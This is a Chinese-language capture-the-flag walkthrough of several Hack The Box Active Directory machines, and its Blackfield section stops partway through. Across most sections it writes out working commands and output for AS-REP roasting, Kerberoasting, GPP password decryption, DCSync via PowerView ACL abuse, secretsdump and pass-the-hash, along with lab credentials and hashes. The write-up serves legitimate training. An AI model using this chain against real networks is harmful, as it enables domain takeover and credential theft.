# HTB_Active_Directory_WriteUp

本文按照：https://docs.google.com/spreadsheets/u/0/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview?pli=1#   循序进行刷题

| 平台 | 题目                        | 是否完成        |
| ---- | --------------------------- | --------------- |
| HTB  | Active                      | √               |
| HTB  | Forest                      | √               |
| HTB  | Sauna                       | √               |
| HTB  | Monteverde                  | √               |
| HTB  | Timelapse                   | √               |
| HTB  | Return                      | √               |
| HTB  | Cascade                     | √               |
| HTB  | Flight                      | √               |
| HTB  | Blackfield                  | √               |
| HTB  | Cicada                      | √               |
| HTB  | Escape                      | √               |
| HTB  | Adagio (HTB Enterprise Box) | ×(企业版打不了) |



## Forest

首先使用nmap对给的IP进行信息收集

> tips:使用`-p-`进行全端口扫描，默认为top1000，V*N延迟有点高，加上实在太慢了

```
┌──(root㉿kali)-[/home/cyborg/Desktop]
└─# nmap -sS 10.10.10.161 -T4 -A --script=vuln 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-03 18:30 CST
Nmap scan report for 10.10.10.161
Host is up (0.56s latency).
Not shown: 989 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-02-03 10:21:50Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
|_ssl-ccs-injection: No reply from server (TIMEOUT)
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
|_ssl-ccs-injection: No reply from server (TIMEOUT)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=2/3%OT=53%CT=1%CU=39837%PV=Y%DS=2%DC=T%G=Y%TM=67A09
OS:B57%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS=S%T
OS:S=A)SEQ(SP=106%GCD=1%ISR=10C%TI=I%CI=RD%II=I%SS=S%TS=A)OPS(O1=M53ANW8ST1
OS:1%O2=M53ANW8ST11%O3=M53ANW8NNT11%O4=M53ANW8ST11%O5=M53ANW8ST11%O6=M53AST
OS:11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80
OS:%W=2000%O=M53ANW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R
OS:=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=
OS:AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=
OS:80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0
OS:%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=1
OS:64%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false

TRACEROUTE (using port 1720/tcp)
HOP RTT       ADDRESS
1   408.41 ms 10.10.16.1
2   627.18 ms 10.10.10.161

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 124.63 seconds

```

找到域为`htb.local`，获取到开放的服务，进一步信息收集

```
smbclient -L //10.10.10.161 -N
```

![image-20250203183915217](./HTB_Active_Directory.assets/image-20250203183915217.png)

匿名登录smb成功，但是没有什么卵信息

```
ldapsearch -x -b "dc=htb,dc=local" -H ldap://10.10.10.161 > 1.txt
```

ldapsearch的输出结果非常多，在终端输出会占用很多地方，让人眼花缭乱

看了一下hint，需要用到impacket的GetNPUsers来列举

首先通过~~ldapsearch(第一遍用这个死活找不到那个用户名)~~**rpcclient**提取所有用户名

enumdomusers是rpcclinet的一个命令，用处是列出域用户，方便我们使用GetNPUsers

```
──(root㉿kali)-[/home/cyborg/Desktop]
└─# rpcclient -U "" -N 10.10.10.161
rpcclient $> enumdomusers
```

![image-20250203192132668](./HTB_Active_Directory.assets/image-20250203192132668.png)

直接做成字典开跑

```
python3 GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -no-pass -usersfile '/home/cyborg/Desktop/user.txt'
```

![image-20250203192327739](./HTB_Active_Directory.assets/image-20250203192327739.png)

找到一个用户**svc-alfresco**的hash，使用john破解

```
john --wordlist=../rockyou.txt hash1.txt 
```

![image-20250203192652972](./HTB_Active_Directory.assets/image-20250203192652972.png)

> tips:拿到了windows的凭证之后，值得查看 WinRM (5985/5986,wsman/wsmans)是否打开

```
evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice 
```

![image-20250203193845197](./HTB_Active_Directory.assets/image-20250203193845197.png)

拿到第一个flag

![image-20250203194011601](./HTB_Active_Directory.assets/image-20250203194011601.png)

由于开的是向导模式，下一个问题是：哪个组对 HTB.LOCAL 域具有 WriteDACL 权限？

没什么头绪，看hint提示使用bloodhound，这个kali不自带，需要自己apt安装下

```
bloodhound -ip 10.10.10.161 -u svc-alfresco -p s3rvice
but要先安装数据库，又是坑。。。
apt-get install neo4j
neo4j start
在运行bloodhound
```

![image-20250203195314565](./HTB_Active_Directory.assets/image-20250203195314565.png)



还得修改，neo4j/123456或者neo4j

https://github.com/SpecterOps/BloodHound-Legacy/tree/master/Collectors下载“收集器"，上传到靶机

![image-20250203201701957](./HTB_Active_Directory.assets/image-20250203201701957.png)

使用

```
.\SharpHound.exe -c all
```

![image-20250203201949540](./HTB_Active_Directory.assets/image-20250203201949540.png)

然后把输出的zip文件download下来，load进bloodhound，我的kali加载进去不显示，卡死，放CSDN的

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/5a777a3f57c0c941829324893676921b.png)

> 从当前 svc-alfresco 的访问权限到 Domain Admins 组中的 Adminsitrator 需要两个步骤。
> 1）svc-alfresco 用户在 Service Account 中，它是 Privileged IT Account 的成员，它是 Account Operators 的成员，所以svc-alfresco 用户是 Account Operators 的成员，并且 Account Operators 对 Exchange Windows Permissions 组具有 Generic All 特权。
> 解释：Account Operators 组授予用户有限的帐户创建权限。该组的成员可以创建和修改大多数类型的帐户，包括用户、本地组和全局组的帐户，并且成员可以本地登录到域控制器。所以可以新建一个abc用户并加入 "Exchange Windows Permissions"组。

```
net user cyborg 123@Abc /add /domain
net group "Exchange Windows Permissions" cyborg /add
```

![image-20250203204046306](./HTB_Active_Directory.assets/image-20250203204046306.png)

DACL(自由访问控制列表)

通过对目标对象的 DACL 的写入访问权限，您可以授予对对象的任何所需权限。这里是为cyborg用户赋予DCSync权限(**DCSync 权限允许用户像域控制器一样同步 Active Directory 中的所有密码。这种权限在攻击者获得后可以用来提取域中所有用户的密码哈希**)，后续可以利用DCSync导出域内所有用户hash。

```
$SecPassword = ConvertTo-SecureString '123@Abc' -AsPlain -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb\cyborg', $SecPassword)
upload ../../../../../../../home/cyborg/Desktop/PowerView.ps1 .
Import-Module .\PowerView.ps1
Add-DomainObjectAcl -PrincipalIdentity cyborg -Credential $Cred  -Rights DCSync
```

tips:终端出现莫名其妙的问题，使用reset来恢复初始化



使用DCSync攻击，导出administrator的hash

```
impacket-secretsdump htb.local/cyborg@10.10.10.161
拿到hash:
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
```

![image-20250203205417414](./HTB_Active_Directory.assets/image-20250203205417414.png)

wmiexec进行PTH攻击

```
impacket-wmiexec htb.local/administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
```

拿到最后flag

![image-20250203205645169](./HTB_Active_Directory.assets/image-20250203205645169.png)



## Sauna

资产收集

```
┌──(root㉿cyborg)-[~/tools]
└─# nmap -sS 10.10.10.175 -A -T4 -p-
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-04 08:34 CST
Nmap scan report for 10.10.10.175
Host is up (0.35s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Egotistical Bank :: Home
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-04 07:45:13Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-02-04T07:46:18
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 6h59m59s

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   304.12 ms 10.10.16.1
2   370.81 ms 10.10.10.175

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 741.79 seconds
```

80端口有web服务

![image-20250204085110697](./HTB_Active_Directory.assets/image-20250204085110697.png)

继续查看nmap结果发现开放ldap

```
rpcclient -U "" -N 10.10.10.175
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
```

匿名访问被禁止，使用smbclient发现同样失败

```
smbclient -L //10.10.10.175 -N
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.175 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

ldapsearch也看不出来什么信息

```
ldapsearch -x -LLL -H ldap://10.10.10.175 -b "dc=egotistical-bank,dc=local"
```

看了眼hint，回归到about页面，用泄露的人名制作字典-.-

![image-20250204090537188](./HTB_Active_Directory.assets/image-20250204090537188.png)

> 从about.html中，您可以获得一个全名列表。通常，Windows 帐户是使用名字和姓氏的某种组合创建的。例如，[first initial][姓氏] 或 [first].[last] 的。username-anarchy 脚本将帮助您创建一个可能的列表。

没试过：

`./username-anarchy --input-file fullnames.txt --select-format first,flast,first.last,firstl > unames.txt while read p; do GetNPUsers.py egotistical-bank.local/"$p" -request -no-pass -dc-ip 10.10.10.175 >> hash.txt; done < unames.txt`

```
fsmith
fergus.smith
smithf
scoins
shaun.coins
coinss
hbear
hugo.bear
bearh
btaylor
bowie.taylor
taylorb
sdriver
sophie.driver
drivers
skerb
steven.kerb
kerbs
```



```
impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ -dc-ip 10.10.10.175 -no-pass -usersfile '/root/swap/htb_swap/ad101_2_user.txt'
```

![image-20250204091308556](./HTB_Active_Directory.assets/image-20250204091308556.png)

拿到fsmith用户的hash，使用john破解

```
john --wordlist=/root/rockyou.txt ad101_2_hash.txt
```

![image-20250204091703226](./HTB_Active_Directory.assets/image-20250204091703226.png)

成功拿到明文密码，根据DC1靶机的思路，首先应该看是否开启(5985/5986,wsman/wsmans)

![image-20250204092027007](./HTB_Active_Directory.assets/image-20250204092027007.png)

```
evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23
```

拿到flag1

![image-20250204092218364](./HTB_Active_Directory.assets/image-20250204092218364.png)

在拿到主机shell后，常常使用WinPEAS来寻找配置存在的问题，来辅助提权

~~但是pipx安装事后一直报错，这里使用的.bat(https://github.com/umsundu/winPEAS/blob/main/winPEAS.bat.txt)~~

艹了，搞了半天，kali自带(也可能是安装了kali-linux-everything的缘故)，`/usr/share/peass/winpeas`

传到靶机上

```
.\winPEASany.exe > out.txt
```

![image-20250204101626450](./HTB_Active_Directory.assets/image-20250204101626450.png)

分析一下输出找到一个配置了autologin的账户

> **DefaultDomainName**: `EGOTISTICALBANK`
>
> **DefaultUserName**: `EGOTISTICALBANK\svc_loanmanager`
>
> **DefaultPassword**: `Moneymakestheworldgoround!`



```
upload ../../../../../../../root/tools/bloodhound-collectors/BloodHound-Legacy/Collectors/SharpHound.exe .
.\SharpHound.exe -c all
download 20250204022721_BloodHound.zip ../../../../../root/swap/20250204022721_BloodHound.zip

```

![image-20250204104118996](./HTB_Active_Directory.assets/image-20250204104118996.png)

然后就是DC1搞过一次的DCSync攻击

有一个方便的工具secretsdump

```
impacket-secretsdump egotistical-bank/svc_loanmgr@10.10.10.175 -just-dc-user Administrator
```

![image-20250204105334202](./HTB_Active_Directory.assets/image-20250204105334202.png)

最后PTH移动即可

Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::

```
impacket-wmiexec EGOTISTICAL-BANK.LOCAL/administrator@10.10.10.175 -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e
```

![image-20250204105824961](./HTB_Active_Directory.assets/image-20250204105824961.png)

拿到flag2



## Active

信息收集：

```
┌──(root㉿cyborg)-[~/tools]
└─# nmap 10.10.10.100 -A -sS -p- -T4
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-05 11:35 CST
Nmap scan report for 10.10.10.100
Host is up (0.36s latency).
Not shown: 65512 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  tcpwrapped
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
49166/tcp open  msrpc         Microsoft Windows RPC
49173/tcp open  msrpc         Microsoft Windows RPC
Device type: general purpose
Running: Microsoft Windows 2008|7|Vista|8.1
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows Vista SP2 or Windows 7 or Windows Server 2008 R2 or Windows 8.1
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-02-05T03:49:20
|_  start_date: 2025-02-05T03:25:16
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required

TRACEROUTE (using port 1720/tcp)
HOP RTT       ADDRESS
1   303.02 ms 10.10.16.1
2   384.12 ms 10.10.10.100

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 842.08 seconds
```



检查smb服务

```
smbclient -L //10.10.10.100 -N
```

存在匿名访问，有共享文件夹

![1738727585148](./HTB_Active_Directory.assets/1738727585148.png)

都尝试了一遍

![image-20250205115712255](./HTB_Active_Directory.assets/image-20250205115712255.png)

只有Replication和IPC$可以访问

> tips:smb没有tree命令，可以用：
>
> ```
> recurse ON
> ls
> ```

![image-20250205120429097](./HTB_Active_Directory.assets/image-20250205120429097.png)

> tips:windows的加密凭证会存在xml文件中，在\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\中找到Groups.xml，内容如下
>
> ```
> <?xml version="1.0" encoding="utf-8"?>
> <Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
> </Groups>
> ```

这是一个 Windows 组策略首选项（GPP）XML 文件，其中包含一个加密的密码字段 (`cpassword`)。可以使用 **gpp-decrypt** 工具来解密它

```
gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
```

![image-20250205120846097](./HTB_Active_Directory.assets/image-20250205120846097.png)

我们就拿到了用户名`active.htb\SVC_TGS`和密码`GPPstillStandingStrong2k18`，查看5985,5986端口不开放

![image-20250205121524831](./HTB_Active_Directory.assets/image-20250205121524831.png)

这时候想起来之前smb，共享了User目录，需要登陆，直接链接进去把flag1 get下来

```
smbclient -U 'active.htb\SVC_TGS' //10.10.10.100/Users
```

![image-20250205124117804](./HTB_Active_Directory.assets/image-20250205124117804.png)

本来到这里是没思路了，问了手AI，想起来`GetUserSPNs`，刚好手上有域用户名和密码(还是生疏，居然把这个忘了-.-

```
┌──(root㉿cyborg)-[~/tools]
└─# impacket-GetUserSPNs -request active.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip 10.10.10.100
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-19 03:06:40.351723  2025-02-05 11:27:33.823080             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$c6689e7cf1be6ded43860f0c67a59920$53a7f24580380868ed8c6a19ac60e3ff63e979f0ffaa49464e678e5784dacef8d8d6cc2bdff8bb5c07ad291d4115f4fcc763e0198015fd0aca545ad09523c8fa99cc71df0683a30566d7f070188e102ba57abb9c5959b7531d7ff4c4da4ab0bd3f224632617a09291ec79d2a2e96127f00235c61376c02b1d62756286b72dfd233781bc8dadd87572a77738b6dc79cf83f184da06db9c263d1a3db0de27f1cbbd0627b54a43f509940230f701bfc9ccb937c13f837d04b840770c4941e6ca097dae94cb791a1c9efcc77e772c703d85633c19043d78b7bfd42fe44f8666e39a2258d980d7e3dc98cbe2dbae899bd4a413364b8965959a4478c9fff1f6760e7a5526c30ee927136313b6615a448e0baeff3ceefc16cd17b975c6801f0b292e502403c3d4eb19544d0d974fe99536eab945514e47d2dcfcc69cc3f6b37d9d027e2b97327b8abe7db8ee4f2c8a9001b70a14112af04cd872fce66e312d6af06c955298553dce6943726577927c88481cc77385c5f6441b3021d6cb856b87395652a47796da64fbdde688ee586a85db9ca3972e670ff5fc1cfd11c0b5883200a57a972d89bedf0a08fe0d20768fd6564863071f77f7236c465cce68bd311e468c21cc75265c3bdd79ab24ed9a9fee0eb225f5422f8119935d6a74ff0cff99f935a3cce3d49edeee88f84e5eb5ddd29d35b400f773b5bb2f3b9b7dbb1f60d46e79a408f3f333fdced0eff7916bafa6e896fb2627899da613a263783c92c24dfc53036520d696a88bf59e431e7d87e4c0a6f1dbe9a77285d4faa2f13078fd0a0b7bfaee8cc295dc019a5ba8331480ee342d856b350b5e3a914458cd4f5db1943bc6d9f7a6475a06e2bae05de7dbb9d9570ffdada490d81f30908b856cdb22cbf2925ca1c440075f1dfc8b87f8cb3a1234c6383475958c31e639fbf78d32afaa934bf7bf645b93f16627053466d308a1d738aa340553ccde9bfc498233d0f168c909dc58c1d1065520a1fdd2e22b9360c3cf336f9b365265700bd35dce3056d7391936d475c021ebb42d8492418d0bf21d4a0ae43dea2ac72068da161b16929d62de5fa52cd63b18ffb3cbf25035aff5dd315621748515b04db40c4c82f39e279b5d2d3d24ca1ff2bdd6309bf7d0ff9bf1540a68a619aa31c63ab324f648618f3cca8ee24b22ab8e0f33045d3ad89ad9129e950b912126131db18bc0a8c8d61ccb9a36bbe619222d48cf9c77004c702722c80fde65531ad7f918e23278f
```

然后使用john破解

```
john --wordlist=~/rockyou.txt ad101_3_hash.txt
```

![image-20250205124805582](./HTB_Active_Directory.assets/image-20250205124805582.png)



```
smbclient -U 'active.htb\administrator' //10.10.10.100/Users
```

![image-20250205125146558](./HTB_Active_Directory.assets/image-20250205125146558.png)

拿到flag2，之前做题老想着RCE了才能打，新思路



## Blackfield

信息收集：

```
┌──(root㉿cyborg)-[~/swap/htb_swap]
└─# nmap -A 10.10.10.192 -sS -p- -T4                                                                                
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-05 20:05 CST
Nmap scan report for 10.10.10.192
Host is up (0.33s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-05 20:10:57Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h59m59s
| smb2-time: 
|   date: 2025-02-05T20:11:32
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   308.37 ms 10.10.16.1
2   377.30 ms 10.10.10.192

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 374.76 seconds
```

smbclient

```
smbclient -L //10.10.10.192 -N 
```

![image-20250205132438490](./HTB_Active_Directory.assets/image-20250205132438490.png)

把这些目录都登录了一遍，只有profiles$成功有东西，发现这个工具很麻烦，找到一个更好的，叫smbmap，可以直接看目录权限，省的一个一个试(第一次做的时候用的smbclient费很大劲都没找到口子)

![image-20250205193011407](./HTB_Active_Directory.assets/image-20250205193011407.png)

ps:最好还是用下面的，快一些

```
smbmap -u guest -H 10.10.10.192
```

![image-20250205202001127](./HTB_Active_Directory.assets/image-20250205202001127.png)

ps:第一遍复制之前的命令忘了改域名，一直搞不到东西-.-

把上面找到的那些名字，做一个字典，进行喷洒

> 在用户列表和 Kerberos 端口打开的情况下，我们可以尝试喷洒用户 Impacket 的 GetNpUsers.py，以查看是否有任何用户禁用了 Kerberos 预身份验证。

```
impacket-GetNPUsers BLACKFIELD.local/ -dc-ip 10.10.10.192 -no-pass -usersfile '/root/swap/htb_swap/ad101_4_user.txt'
```

![image-20250205202637685](./HTB_Active_Directory.assets/image-20250205202637685.png)

也是撕开口子了....

```
$krb5asrep$23$support@BLACKFIELD.LOCAL:f7d67890efe2f21e84b6f963f33307c4$7c8bb1bf4673ecf7ef4259a1c7d59998afa1fcca37cce0bdae60f7a28df780a2468649f8e7a3a9b4802414e002aec268f6380db2c29a09b5f834fb405839221427b18a70b442cf6f1293278b1572bc50e59ae28316689b133bee853d18e762f3acab1bcadbd1b4a63a727f40955f803b47290e5a9d71a2f96f15f89b2510844ba7bfd44008ebeee89557f92818bd175a8d3c038b7e71d09dda894ef06eb1bc6f7f9568d0c5adefaba0708f3f9fd4887b8f3d15e09d06c42485c18a4109d491f96cbaa8d6e812eaca070d1c7a4236e23813cf1ec736f2f384b5ccf20bb4bcb8520d9fe354531cc4debe60d7e5e48626cf9365483e
```

然后常规爆破

![image-20250205202750909](./HTB_Active_Directory.assets/image-20250205202750909.png)

域用户名:`BLACKFIELD.local\support`
密码:`#00^BlackKnight`

老生常谈，***拿到了windows的凭证之后，值得查看 WinRM (5985/5986,wsman/wsmans)是否打开***

![image-20250205203006395](./HTB_Active_Directory.assets/image-20250205203006395.png)

~~上组合拳，evil-winrm ：，~~这里惯性思维了，bloodhound并不是非要传exe上去提取信息，可以使用bloodhound-python直接

```
bloodhound-python -u support -p '#00^BlackKnight' -d BLACKFIELD.local -ns 10.10.10.192 -c DcOnly
```

![image-20250205204914444](./HTB_Active_Directory.assets/image-20250205204914444.png)

导入到bloodhound，左上角输入域用户名，右键看路径

![image-20250205204850227](./HTB_Active_Directory.assets/image-20250205204850227.png)

翻了翻，找到一个可以更改用户密码的用户

![image-20250205210407081](./HTB_Active_Directory.assets/image-20250205210407081.png)

上去改密码，再拿个用户权限看看先

```
rpcclient -U support 10.10.10.192
```

尝试了很多命令才改成功

![image-20250205211358659](./HTB_Active_Directory.assets/image-20250205211358659.png)

```
setuserinfo AUDIT2020 23 123@Abc
```

这里这个level是23，确实让人很疑惑，相关文章是https://malicious.link/posts/2017/reset-ad-user-password-with-linux/，关于23的解释在https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN

> 要使用*`rpcclient`*工具设置用户的密码，通常可以使用*`setuserinfo2`*函数，级别为 23。`level`参数对应于您正在修改的用户资料级别，而对于更改密码，相关级别为 23。 23 级包含 1 级的所有属性（提供基本用户信息），并增加了修改用户密码的功能。

~~`AUDIT2020`这个用户是可以登录winrm的~~。不幸的是也无法登陆-.-，看看smb共享有没有区别

```
smbmap -u 'AUDIT2020' -p '123@Abc' -H 10.10.10.192
```

![image-20250205211911050](./HTB_Active_Directory.assets/image-20250205211911050.png)

对比之前的，多了下面三个

```
forensic
IPC$
NETLOGON 
SYSVOL
```

![image-20250205212256869](./HTB_Active_Directory.assets/image-20250205212256869.png)

~~SYSVOL发现一个文件夹，直接展开~~

> tips:cd命令遇到文件夹包含空格(一遇一个不吱声)，双引号硬起来就行
>
> ![image-20250205213702583](./HTB_Active_Directory.assets/image-20250205213702583.png)

正解：在forensic目录下...，我在SYSVOL翻了半天

![image-20250205214314605](./HTB_Active_Directory.assets/image-20250205214314605.png)

